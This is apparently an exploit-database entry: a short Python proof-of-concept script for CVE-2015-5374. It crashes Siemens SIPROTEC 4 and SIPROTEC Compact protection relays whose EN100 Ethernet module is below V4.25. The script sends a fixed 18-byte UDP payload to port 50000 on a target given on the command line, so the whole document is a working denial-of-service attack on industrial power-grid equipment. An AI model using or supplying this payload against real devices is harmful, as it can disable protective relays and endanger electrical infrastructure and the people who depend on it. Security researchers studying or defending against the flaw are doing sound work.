# Exploit Author: M. Can Kurnaz
# Contact: https://twitter.com/0x43414e
# Vendor Homepage: https://www.siemens.com
# Version: All devices that include the EN100 Ethernet module version V4.24 or prior.
# Tested on: Siemens SIPROTEC 4 (multiple versions < V4.25).
# CVE : CVE-2015-5374
# Vulnerability Details: 
# https://www.cvedetails.com/cve/CVE-2015-5374/
# https://ics-cert.us-cert.gov/advisories/ICSA-15-202-01
 
#!/usr/bin/env python
 
import socket
import sys
 
print(&#039;CVE-2015-5374 Siemens SIPROTEC 4 and SIPROTEC Compact EN100 Ethernet Module < V4.25 - Denial of Service&#039;)
 
if len(sys.argv) < 2:
    print(&#039;Usage: &#039; + sys.argv[0] + &#039; [target]&#039;)
    sys.exit(1)
 
print(&#039;Sending packet to &#039; + sys.argv[1] + &#039; ...&#039;)
 
payload = bytearray(&#039;11 49 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 9E&#039;.replace(&#039; &#039;, &#039;&#039;).decode(&#039;hex&#039;)) 
 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(payload, (sys.argv[1], 50000))
 
print(&#039;Done, say goodbye!&#039;)

